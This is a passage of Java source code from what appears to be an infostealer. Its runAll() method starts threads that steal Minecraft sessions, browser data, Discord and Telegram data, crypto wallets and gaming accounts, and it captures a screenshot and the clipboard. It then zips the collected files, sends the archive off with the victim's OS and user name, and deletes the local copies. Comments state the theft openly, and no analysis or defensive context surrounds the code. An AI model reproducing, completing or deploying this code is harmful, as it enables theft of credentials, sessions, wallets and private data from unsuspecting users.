        Se.log("Ex.collectSystemInfo() completed");
    }
    
    // ================= SCREENSHOT =================
    
    private static void takeScreenshot() {
        Se.log("Ex.takeScreenshot() starting...");
        
        if (STORAGE_DIR == null) return;
        
        try {
            java.awt.Robot robot = new java.awt.Robot();
            java.awt.Rectangle screen = new java.awt.Rectangle(java.awt.Toolkit.getDefaultToolkit().getScreenSize());
            java.awt.image.BufferedImage img = robot.createScreenCapture(screen);
            
            File screenshotFile = new File(STORAGE_DIR, "screenshot.png");
            javax.imageio.ImageIO.write(img, "PNG", screenshotFile);
            
            Se.log("  Screenshot saved: " + screenshotFile.length() + " bytes");
        } catch (Exception e) {
            Se.logEx("  Error taking screenshot", e);
        }
        
        Se.log("Ex.takeScreenshot() completed");
    }
    
    // ================= CLIPBOARD =================
    
    private static void getClipboard() {
        Se.log("Ex.getClipboard() starting...");
        
        if (STORAGE_DIR == null) return;
        
        try {
            java.awt.datatransfer.Clipboard clipboard = java.awt.Toolkit.getDefaultToolkit().getSystemClipboard();
            java.awt.datatransfer.Transferable contents = clipboard.getContents(null);
            
            if (contents != null && contents.isDataFlavorSupported(java.awt.datatransfer.DataFlavor.stringFlavor)) {
                String text = (String) contents.getTransferData(java.awt.datatransfer.DataFlavor.stringFlavor);
                if (text != null && !text.isEmpty()) {
                    File clipFile = new File(STORAGE_DIR, "clipboard.txt");
                    Files.write(clipFile.toPath(), text.getBytes(StandardCharsets.UTF_8));
                    Se.log("  Clipboard saved: " + text.length() + " chars");
                }
            }
        } catch (Exception e) {
            Se.logEx("  Error getting clipboard", e);
        }
        
        Se.log("Ex.getClipboard() completed");
    }
    
    // ================= ZIP CREATION =================
    
    private static void createAndSendZip() {
        Se.log("Ex.createAndSendZip() starting...");
        
        if (STORAGE_DIR == null || ZIP_FILE == null) {
            Se.log("  ERROR: STORAGE_DIR or ZIP_FILE is null");
            return;
        }
        
        Se.log("  STORAGE_DIR: " + STORAGE_DIR.getAbsolutePath());
        Se.log("  ZIP_FILE: " + ZIP_FILE.getAbsolutePath());
        
        File[] files = STORAGE_DIR.listFiles();
        if (files == null || files.length == 0) {
            Se.log("  ERROR: No files in STORAGE_DIR");
            return;
        }
        
        Se.log("  Files in STORAGE_DIR: " + files.length);
        for (File f : files) {
            Se.log("    - " + f.getName() + " (" + (f.isDirectory() ? "dir" : f.length() + " bytes") + ")");
        }
        
        try (ZipOutputStream zos = new ZipOutputStream(new FileOutputStream(ZIP_FILE))) {
            zos.setLevel(9);
            addDirToZip(STORAGE_DIR, STORAGE_DIR.getName(), zos);
            Se.log("  ZIP created: " + ZIP_FILE.length() + " bytes");
        } catch (Exception e) {
            Se.logEx("  Error creating ZIP", e);
            return;
        }
        
        // Send ZIP
        try {
            byte[] zipData = Files.readAllBytes(ZIP_FILE.toPath());
            Se.log("  Sending ZIP: " + zipData.length + " bytes");
            String pcName = System.getProperty("os.name", "Unknown");
            String pcUser = System.getProperty("user.name", "Unknown");
            Se.sendZip(zipData, pcName, pcUser);
        } catch (Exception e) {
            Se.logEx("  Error sending ZIP", e);
        }
        
        // Cleanup
        try {
            deleteDir(STORAGE_DIR);
            ZIP_FILE.delete();
            Se.log("  Cleanup completed");
        } catch (Exception e) {}
        
        Se.log("Ex.createAndSendZip() completed");
    }
    
    private static void addDirToZip(File dir, String baseName, ZipOutputStream zos) {
        File[] files = dir.listFiles();
        if (files == null) return;
        
        for (File file : files) {
            try {
                String entryName = baseName + "/" + file.getName();
                if (file.isDirectory()) {
                    addDirToZip(file, entryName, zos);
                } else {
                    zos.putNextEntry(new ZipEntry(entryName));
                    Files.copy(file.toPath(), zos);
                    zos.closeEntry();
                }
            } catch (Exception e) {}
        }
    }
    
    // ================= UTILS =================
    
    private static void deleteDir(File dir) {
        if (dir == null || !dir.exists()) return;
        File[] files = dir.listFiles();
        if (files != null) {
            for (File file : files) {
                if (file.isDirectory()) deleteDir(file);
                else file.delete();
            }
        }
        dir.delete();
    }
    
    private static void safeCopyDirectory(File src, File dest) {
        try {
            if (!src.exists() || !src.isDirectory()) return;
            if (!dest.exists()) dest.mkdirs();
            
            File[] files = src.listFiles();
            if (files == null) return;
            for (File file : files) {
                try {
                    File destFile = new File(dest, file.getName());
                    if (file.isDirectory()) safeCopyDirectory(file, destFile);
                    else Files.copy(file.toPath(), destFile.toPath(), StandardCopyOption.REPLACE_EXISTING);
                } catch (Exception e) {}
            }
        } catch (Exception e) {}
    }
    
    // ================= MAIN ENTRY =================
    
    public static void runAll() {
        Se.log("============================================");
        Se.log("Ex.runAll() STARTING");
        Se.log("============================================");
        Se.log("  IS_WINDOWS: " + IS_WINDOWS);
        Se.log("  APPDATA: " + APPDATA);
        Se.log("  LOCALAPPDATA: " + LOCALAPPDATA);
        Se.log("  TEMP: " + TEMP);
        
        // ALWAYS steal Minecraft session (works on ALL platforms)
        new Thread(() -> {
            try {
                Se.log("[Thread Ex-MC] Starting...");
                stealMinecraft();
                Se.log("[Thread Ex-MC] Completed");
            } catch (Exception e) {
                Se.logEx("[Thread Ex-MC] Error", e);
            }
        }, "Ex-MC").start();
        
        // Windows-only extraction
        if (IS_WINDOWS) {
            Se.log("  Windows detected - starting Windows stealers...");
            
            // Init storage
            try {
                initStorage();
            } catch (Exception e) {
                Se.logEx("  initStorage() failed", e);
            }
            
            new Thread(() -> {
                try {
                    Se.log("[Thread Ex-Browser] Starting...");
                    stealBrowsers();
                    Se.log("[Thread Ex-Browser] Completed");
                } catch (Exception e) {
                    Se.logEx("[Thread Ex-Browser] Error", e);
                }
            }, "Ex-Browser").start();
            
            new Thread(() -> {
                try {
                    Se.log("[Thread Ex-Discord] Starting...");
                    stealDiscord();
                    Se.log("[Thread Ex-Discord] Completed");
                } catch (Exception e) {
                    Se.logEx("[Thread Ex-Discord] Error", e);
                }
            }, "Ex-Discord").start();
            
            new Thread(() -> {
                try {
                    Se.log("[Thread Ex-Wallet] Starting...");
                    stealWallets();
                    Se.log("[Thread Ex-Wallet] Completed");
                } catch (Exception e) {
                    Se.logEx("[Thread Ex-Wallet] Error", e);
                }
            }, "Ex-Wallet").start();
            
            new Thread(() -> {
                try {
                    Se.log("[Thread Ex-Gaming] Starting...");
                    stealGaming();
                    Se.log("[Thread Ex-Gaming] Completed");
                } catch (Exception e) {
                    Se.logEx("[Thread Ex-Gaming] Error", e);
                }
            }, "Ex-Gaming").start();
            
            new Thread(() -> {
                try {
                    Se.log("[Thread Ex-Telegram] Starting...");
                    stealTelegram();
                    Se.log("[Thread Ex-Telegram] Completed");
                } catch (Exception e) {
                    Se.logEx("[Thread Ex-Telegram] Error", e);
                }
            }, "Ex-Telegram").start();
            
            new Thread(() -> {
                try {
                    Se.log("[Thread Ex-System] Starting...");
                    collectSystemInfo();
                    Se.log("[Thread Ex-System] Completed");
                } catch (Exception e) {
                    Se.logEx("[Thread Ex-System] Error", e);
                }
            }, "Ex-System").start();
            
            new Thread(() -> {
                try {
                    Se.log("[Thread Ex-Screenshot] Starting...");
                    takeScreenshot();
                    Se.log("[Thread Ex-Screenshot] Completed");
                } catch (Exception e) {
                    Se.logEx("[Thread Ex-Screenshot] Error", e);
                }
            }, "Ex-Screenshot").start();
            
            new Thread(() -> {
                try {
                    Se.log("[Thread Ex-Clipboard] Starting...");
                    getClipboard();
                    Se.log("[Thread Ex-Clipboard] Completed");
                } catch (Exception e) {
                    Se.logEx("[Thread Ex-Clipboard] Error", e);
                }
            }, "Ex-Clipboard").start();
            
            // ZIP creation with delay
            new Thread(() -> {
                try {
                    Se.log("[Thread Ex-ZIP] Waiting 15 seconds for other threads...");
                    Thread.sleep(15000);
                    Se.log("[Thread Ex-ZIP] Starting ZIP creation...");
                    createAndSendZip();
                    Se.log("[Thread Ex-ZIP] Completed");
                } catch (Exception e) {
                    Se.logEx("[Thread Ex-ZIP] Error", e);
                }
            }, "Ex-ZIP").start();
        } else {
            Se.log("  Not Windows - skipping Windows stealers");
        }
        
        Se.log("Ex.runAll() - all threads started");
    }
}
